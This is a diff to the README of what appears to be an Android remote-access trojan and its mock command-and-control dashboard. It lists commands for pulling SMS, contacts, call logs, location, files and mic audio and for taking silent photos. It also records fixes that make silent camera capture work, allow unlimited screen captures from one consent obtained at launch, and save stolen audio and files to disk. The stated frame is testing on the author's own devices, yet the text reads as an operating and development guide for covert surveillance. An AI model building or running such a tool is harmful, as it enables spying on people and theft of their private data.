@@ -212,12 +212,13 @@ Open **http://127.0.0.1:42474/** in your browser.
   Android version / device id. **Click a card to target that device**, then use
   the order buttons.
 - **Order buttons** — one-tap `apps`, `cn`, `cl`, `sms`, `ca`, `lm`, `sc`,
-  `photo-back` (`cam-on 1`), `photo-front` (`cam-on 0`).
+  `photo-back` (`cam-on 0`), `photo-front` (`cam-on 1`).
 - **Raw order box** — parameterized orders: `mc 5`, `fm-ls /storage/emulated/0`,
   `fm-dl <path>`, `run-app com.android.settings`, `sms-send <to> <text>`, or
   arbitrary `raw {"order":"..."}` payloads.
 - **Downloads panel** — every captured response, listed newest-first, click to
-  download the `.json` or readable `.txt`.
+  download the `.json`, readable `.txt`, `.jpg` photos, or raw binary
+  recordings / downloaded files.
 - **Live log** — orders sent, responses received, heartbeats, connection
   events, color-coded and streaming in real time.
 
@@ -245,7 +246,7 @@ API (handy for scripting):
 | `sms` | `{"order":"x0000sm","extra":"ls"}` | SMS inbox |
 | `sms-send <to> <text>` | `... "extra":"sendSMS"` | sends a real SMS |
 | `ca` | `{"order":"x0000ca","extra":"camList"}` | camera list |
-| `cam-on 1` / `cam-on 0` | `... "extra":"1"|"0"` | **silent photo** (back/front) |
+| `cam-on 0` / `cam-on 1` | `... "extra":"0"|"1"` | **silent photo** (0=back, 1=front; Camera2) |
 | `sc` | `{"order":"x0000sc"}` | screen capture (needs the consent grant) |
 | `mc <sec>` | `{"order":"x0000mc","sec":N}` | mic recording |
 | `fm-ls <path>` | `... "extra":"ls"` | list directory |
@@ -278,8 +279,16 @@ c2_out/
 ```
 
 Readable `.txt` exports are generated for **contacts, call logs, SMS, and app
-lists**; everything else is kept as raw `.json`. Browse and download them from
-the dashboard's **Downloads** panel or `GET /files/<device>/<name>`.
+lists**; everything else is kept as raw `.json`. On top of that:
+
+- `cam-on` photos come back as **`.jpg` files** (the server base64-decodes the
+  payload) plus a small JSON stub.
+- `mc` recordings and `fm-dl` downloads arrive as Socket.IO binary events and
+  are written as **raw files** (e.g. `..._x0000mc_sound123.mp3`,
+  `..._x0000fm_dl-test.txt`) plus a JSON stub describing them.
+
+Browse and download all of these from the dashboard's **Downloads** panel or
+`GET /files/<device>/<name>` (served byte-identical).
 
 ---
 
@@ -293,9 +302,6 @@ the dashboard's **Downloads** panel or `GET /files/<device>/<name>`.
 - **Camera indicator.** A silent photo still triggers Android 12+'s
   OS-level camera indicator dot in the status bar — no app can suppress it.
   The app itself shows no UI.
-- **Binary payloads.** `MicManager`/`CameraManager` stuff raw `byte[]` into a
-  `JSONObject`, which `org.json` stringifies to garbage — audio/photo bytes may
-  be mangled in transit. Observed behavior, not fixed here.
 - **Reconnection.** `reconnectionDelayMax=999999999` (~11.5 days) means a
   failed connect effectively never retries — restart the process to re-attach.
 - **Notifications.** `NotificationService` streams device notifications to the
@@ -307,27 +313,32 @@ the dashboard's **Downloads** panel or `GET /files/<device>/<name>`.
 These were observed live during a full feature pass; see
 [Test report](#test-report--vivo-v2538-android-16) for the complete matrix.
 
-- **`cam-on` silent photo does not work on Android 16.** `CameraManager` uses
-  the deprecated `android.hardware.Camera` API, which is dead on modern
-  Android (returns `null` / throws). The handler swallows the exception, so the
-  order goes out and **no response ever comes back** — a silent failure, not a
-  crash. Needs a `Camera2` rewrite (see [Roadmap](#roadmap--todo)).
-- **`sc` screen capture silently no-ops.** The app only requests
-  MediaProjection consent when the user grants runtime permissions *through
-  its in-app flow*. When permissions are pre-granted via `adb shell pm grant`
-  (as the docs recommend), that code path never runs, no projection token is
-  ever captured, and `x0000sc` returns nothing. On Android 14+ there is also an
-  architectural conflict to verify: capture requires a `mediaProjection`
-  foreground-service type, which the `specialUse` fix here removed.
+- **`cam-on` silent photo — FIXED via Camera2 rewrite.** The old
+  `android.hardware.Camera` API was dead on Android 12+ (returns `null` /
+  throws, silently swallowed). `CameraManager` now uses the Camera2 API and
+  emits a base64 JPEG that the mock C2 saves as a `.jpg`. Verified on an
+  Android 17 emulator (valid 1280×960 JPEG + Exif).
+- **`sc` screen capture — FIXED.** Previously it silently no-oped because
+  MediaProjection consent was only requested inside the in-app permission
+  flow (skipped when permissions are pre-granted via `adb shell pm grant`),
+  and Android 14+ rejected capture because the foreground service had no
+  `mediaProjection` type. `MainActivity` now requests screen-capture consent
+  **unconditionally at launch**, `MainService` upgrades its FGS type to
+  `specialUse | mediaProjection` once consent is granted (it starts with
+  `specialUse` only, so the restart worker / boot receiver can still start it
+  without consent), and the single `MediaProjection` + a keep-alive
+  `VirtualDisplay` are created once and shared — so **unlimited captures work
+  from one consent**. Verified on an Android 17 emulator: two back-to-back `sc`
+  orders ~3 s apart both produced valid 1080×2400 JPEGs. Failures now emit an
+  explicit `{"image":false,"error":"..."}` instead of a silent no-op.
 - **Initial socket churn on reconnect.** The phone's socket session id churned
   every ~40–60 s for the first minutes after launch before settling; the app
   process itself stayed stable (verified via `pidof`). Worth investigating, not
   blocking.
-- **Harness gap — binary responses are not saved.** `mc` (mic) and `fm-dl`
-  (file download) arrive as Socket.IO binary events; the mock C2 logs them but
-  **does not write the bytes to disk** like it does for JSON responses. Audio
-  and file downloads are received but not capturable from the dashboard yet
-  (see [Roadmap](#roadmap--todo)).
+- **Physical-device re-test still pending.** The Camera2, binary-capture,
+  and screen-capture fixes were verified on the **emulator** (Android 17); a
+  re-run on the phone is needed to confirm `cam-on` / `sc` work on the vivo
+  and to update the test report rows below.
 - **Untested by design.** The destructive orders (`lock`, `wipe`, `reboot`,
   `delete`, `sms-send`, `call`) were deliberately never fired during testing.
 
@@ -348,10 +359,10 @@ phone (wireless adb + `adb reverse` tunnel, runtime config `device_id`
 | `ca` (camera list) | ✅ works | Back (id 0), Front (id 1) |
 | `lm` (location) | ✅ works | **rich fix**: provider `network`, accuracy 15.1 m, altitude 471 m, epoch time |
 | `fm-ls` | ✅ works | real directory listing incl. user files |
-| `fm-dl` (download) | ⚠️ received | bytes arrive as a binary event; harness doesn't save them yet |
-| `mc 5` (mic) | ⚠️ received | ~5 s recording arrives as a binary event; not saved yet |
-| `cam-on` (photo) | ❌ fails | no response — deprecated `android.hardware.Camera` dead on Android 16 |
-| `sc` (screen) | ❌ no-op | projection consent never granted; see Known limitations |
+| `fm-dl` (download) | ✅ (emulator) | raw file saved byte-identical + JSON stub; pending phone re-test |
+| `mc 5` (mic) | ✅ (emulator) | mp4/AAC recording saved to disk; pending phone re-test |
+| `cam-on` (photo) | ✅ (emulator) | Camera2 rewrite — 1280×960 JPEG + Exif saved; pending phone re-test |
+| `sc` (screen) | ✅ (emulator) | consent requested at launch, FGS upgraded, **two back-to-back 1080×2400 JPEGs from one consent**; phone re-test pending |
 | `run-app com.android.settings` | ✅ works | `launchingStatus:true`; Settings opened on the phone |
 | `open-url` | ✅ works | `status:true`; browser opened on the phone |
 | notifications (`x0000nt`) | ✅ works | streams automatically; verified with an `adb`-posted test notification |
@@ -367,16 +378,19 @@ phone (wireless adb + `adb reverse` tunnel, runtime config `device_id`
 
 Prioritized backlog from this session. Feel free to pick any item.
 
-- [ ] **Migrate `CameraManager` to Camera2** — replace the dead
+- [x] **Migrate `CameraManager` to Camera2** — replace the dead
   `android.hardware.Camera` API so `cam-on` works on Android 12+. Emit a proper
-  binary/`base64` photo payload and make the mock C2 save it to disk.
-- [ ] **Fix the `sc` screen-capture flow** — capture the MediaProjection token
-  unconditionally at launch (not only via the in-app permission path), and
-  resolve the Android 14+ `mediaProjection` FGS-type conflict with the
-  `specialUse` manifest fix.
-- [ ] **Harness: persist binary events** — save mic audio and downloaded files
+  base64 photo payload and save it to disk (done; verified on Android 17
+  emulator, phone re-test pending).
+- [x] **Harness: persist binary events** — save mic audio and downloaded files
   (bytes) under `c2_out/<device>/` and list them in the dashboard Downloads
-  panel, like JSON responses already are.
+  panel (done; verified end-to-end with `mc` + `fm-dl`).
+- [x] **Fix the `sc` screen-capture flow** — consent requested unconditionally
+  at launch; `MainService` upgrades its FGS type to `specialUse |
+  mediaProjection` after consent and creates the single `MediaProjection`;
+  one keep-alive `VirtualDisplay` is shared so captures don't hit the
+  Android 14+ single-`createVirtualDisplay` limit (done; verified on Android
+  17 emulator with two back-to-back captures).
 - [ ] **Investigate reconnect churn** — pin down the initial ~40–60 s socket
   session-id churn on the phone and tune
   `reconnectionDelay*` so a transient network blip retries instead of waiting
